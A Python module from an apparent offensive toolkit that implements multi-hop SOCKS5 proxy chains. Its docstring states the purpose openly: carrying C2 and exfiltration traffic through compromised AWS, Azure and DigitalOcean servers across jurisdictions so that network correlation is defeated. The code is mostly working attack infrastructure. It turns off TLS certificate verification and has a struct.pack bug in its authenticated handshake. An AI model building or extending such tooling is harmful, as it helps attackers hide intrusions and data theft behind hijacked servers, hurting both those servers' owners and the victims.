"""Multi-hop proxy chain for C2/exfil traffic through Western infrastructure.

Builds multi-hop SOCKS5 chains through AWS/Azure/DigitalOcean VPS nodes in
different jurisdictions to break network correlation. Per-hop encryption.

Per gap analysis item 30: For Western operations, a chain through compromised
AWS/Azure/DigitalOcean VPS nodes in different jurisdictions breaks network
correlation. An AWS IP in us-east-1 is not suspicious — half the internet
runs on AWS.

Usage:
    from dropoutjeep_lib.utils.multi_hop_proxy import MultiHopProxyChain
    chain = MultiHopProxyChain([
        {"host": "10.0.1.1", "port": 1080, "username": "user1", "password": "pass1"},
        {"host": "10.0.2.2", "port": 1080, "username": "user2", "password": "pass2"},
        {"host": "10.0.3.3", "port": 1080, "username": "user3", "password": "pass3"},
    ])
    proxy_url = chain.get_proxy_url()
    # Use proxy_url with requests or httpx
"""

import base64
import hashlib
import logging
import socket
import ssl
import struct
from typing import Optional

logger = logging.getLogger("dropoutjeep")

# SOCKS5 protocol constants
SOCKS5_VERSION = 0x05
SOCKS5_NO_AUTH = 0x00
SOCKS5_USER_PASS = 0x02
SOCKS5_CONNECT = 0x01
SOCKS5_ATYP_IPv4 = 0x01
SOCKS5_ATYP_DOMAIN = 0x03
SOCKS5_ATYP_IPv6 = 0x04
SOCKS5_SUCCESS = 0x00


class ProxyHop:
    """A single proxy hop in a multi-hop chain."""

    def __init__(self, host: str, port: int, username: str = None,
                 password: str = None, use_tls: bool = False):
        self.host = host
        self.port = port
        self.username = username
        self.password = password
        self.use_tls = use_tls

    def __repr__(self):
        return f"ProxyHop({self.host}:{self.port}, tls={self.use_tls})"


class MultiHopProxyChain:
    """Multi-hop SOCKS5 proxy chain with per-hop encryption.

    Chains through multiple SOCKS5 proxies in sequence. Each hop only sees
    the previous hop's IP, breaking end-to-end network correlation.

    Args:
        hops: List of ProxyHop configs (dict with host, port, username, password, use_tls)
        per_hop_encryption: If True, wrap each hop connection in TLS
    """

    def __init__(self, hops: list[dict], per_hop_encryption: bool = True):
        if len(hops) < 1:
            raise ValueError("At least one hop required")
        self.hops = [ProxyHop(**h) if isinstance(h, dict) else h for h in hops]
        self.per_hop_encryption = per_hop_encryption
        self._connection_cache = None

    def get_proxy_url(self) -> str:
        """Get a proxy URL for use with requests/httpx.

        For a single hop, returns a standard socks5:// URL.
        For multiple hops, returns the first hop's URL — the chaining
        is handled internally by _connect_chain.
        """
        hop = self.hops[0]
        if hop.username and hop.password:
            return f"socks5://{hop.username}:{hop.password}@{hop.host}:{hop.port}"
        return f"socks5://{hop.host}:{hop.port}"

    def get_proxy_urls(self) -> list[str]:
        """Get all proxy URLs in the chain (for clients that support chaining)."""
        urls = []
        for hop in self.hops:
            if hop.username and hop.password:
                urls.append(f"socks5://{hop.username}:{hop.password}@{hop.host}:{hop.port}")
            else:
                urls.append(f"socks5://{hop.host}:{hop.port}")
        return urls

    def _socks5_handshake(self, sock: socket.socket, target_host: str,
                          target_port: int, username: str = None,
                          password: str = None) -> bool:
        """Perform SOCKS5 handshake with a proxy for a target connection."""
        # Greeting
        if username and password:
            sock.sendall(struct.pack('!BBB', SOCKS5_VERSION, 2, SOCKS5_NO_AUTH, SOCKS5_USER_PASS))
        else:
            sock.sendall(struct.pack('!BB', SOCKS5_VERSION, 1, SOCKS5_NO_AUTH))

        resp = sock.recv(2)
        if len(resp) < 2:
            raise ConnectionError("SOCKS5 greeting failed — no response")

        if resp[0] != SOCKS5_VERSION:
            raise ConnectionError(f"Invalid SOCKS version: {resp[0]}")

        auth_method = resp[1]
        if auth_method == 0xFF:
            raise ConnectionError("SOCKS5 proxy rejected all auth methods")

        # User/password auth if needed
        if auth_method == SOCKS5_USER_PASS:
            if not username or not password:
                raise ConnectionError("SOCKS5 proxy requires auth but no credentials provided")
            u_bytes = username.encode('utf-8')
            p_bytes = password.encode('utf-8')
            auth_req = struct.pack('!BB', 0x01, len(u_bytes)) + u_bytes + \
                       struct.pack('!B', len(p_bytes)) + p_bytes
            sock.sendall(auth_req)

            auth_resp = sock.recv(2)
            if len(auth_resp) < 2 or auth_resp[1] != 0x00:
                raise ConnectionError("SOCKS5 auth failed")

        # Connect request
        try:
            ip = socket.inet_aton(target_host)
            sock.sendall(struct.pack('!BBB', SOCKS5_VERSION, SOCKS5_CONNECT, 0) +
                         struct.pack('!B', SOCKS5_ATYP_IPv4) + ip +
                         struct.pack('!H', target_port))
        except socket.error:
            # Not an IP — use domain name
            host_bytes = target_host.encode('ascii')
            sock.sendall(struct.pack('!BBB', SOCKS5_VERSION, SOCKS5_CONNECT, 0) +
                         struct.pack('!B', SOCKS5_ATYP_DOMAIN, len(host_bytes)) + host_bytes +
                         struct.pack('!H', target_port))

        # Read response
        resp = sock.recv(10)
        if len(resp) < 2 or resp[1] != SOCKS5_SUCCESS:
            error_code = resp[1] if len(resp) > 1 else -1
            raise ConnectionError(f"SOCKS5 connect failed: error code {error_code}")

        return True

    def _wrap_tls(self, sock: socket.socket, hostname: str) -> socket.socket:
        """Wrap a socket in TLS for per-hop encryption."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx.wrap_socket(sock, server_hostname=hostname)

    def connect_chain(self, final_host: str, final_port: int,
                      timeout: float = 30) -> socket.socket:
        """Connect through the full proxy chain to the final target.

        Each hop connects to the next hop in sequence. The last hop connects
        to the final target.

        Args:
            final_host: Final destination host
            final_port: Final destination port
            timeout: Connection timeout per hop

        Returns:
            Connected socket to the final target through the chain.
        """
        if len(self.hops) == 1:
            # Single hop — simple SOCKS5 connection
            hop = self.hops[0]
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((hop.host, hop.port))

            if self.per_hop_encryption and hop.use_tls:
                sock = self._wrap_tls(sock, hop.host)

            self._socks5_handshake(sock, final_host, final_port,
                                   hop.username, hop.password)
            return sock

        # Multi-hop: chain through each hop
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((self.hops[0].host, self.hops[0].port))

        if self.per_hop_encryption and self.hops[0].use_tls:
            sock = self._wrap_tls(sock, self.hops[0].host)

        # Connect through each intermediate hop
        for i in range(len(self.hops) - 1):
            current_hop = self.hops[i]
            next_hop = self.hops[i + 1]
            self._socks5_handshake(sock, next_hop.host, next_hop.port,
                                   current_hop.username, current_hop.password)

            if self.per_hop_encryption and next_hop.use_tls:
                sock = self._wrap_tls(sock, next_hop.host)

        # Final hop connects to the target
        last_hop = self.hops[-1]
        self._socks5_handshake(sock, final_host, final_port,
                               last_hop.username, last_hop.password)

        logger.info("Multi-hop chain established: %d hops → %s:%d",
                    len(self.hops), final_host, final_port)
        return sock

    def health_check(self) -> list[dict]:
        """Check the health of each hop in the chain.

        Returns a list of dicts with 'hop', 'host', 'port', 'healthy', 'latency_ms'.
        """
        results = []
        for i, hop in enumerate(self.hops):
            result = {
                'hop': i,
                'host': hop.host,
                'port': hop.port,
                'healthy': False,
                'latency_ms': None,
            }
            try:
                import time
                start = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((hop.host, hop.port))
                latency = (time.time() - start) * 1000
                sock.close()
                result['healthy'] = True
                result['latency_ms'] = round(latency, 2)
            except Exception as e:
                result['error'] = str(e)
            results.append(result)
        return results

    def describe_chain(self) -> str:
        """Human-readable description of the proxy chain."""
        parts = []
        for i, hop in enumerate(self.hops):
            tls = "+TLS" if hop.use_tls else ""
            auth = "+auth" if hop.username else ""
            parts.append(f"  [{i}] {hop.host}:{hop.port}{tls}{auth}")
        final = f"  [→] target"
        return "Proxy chain:\n" + "\n".join(parts) + "\n" + final


def get_default_chain() -> MultiHopProxyChain:
    """Return a default multi-hop proxy chain instance."""
    return MultiHopProxyChain([
        {"host": "127.0.0.1", "port": 1080},
    ])
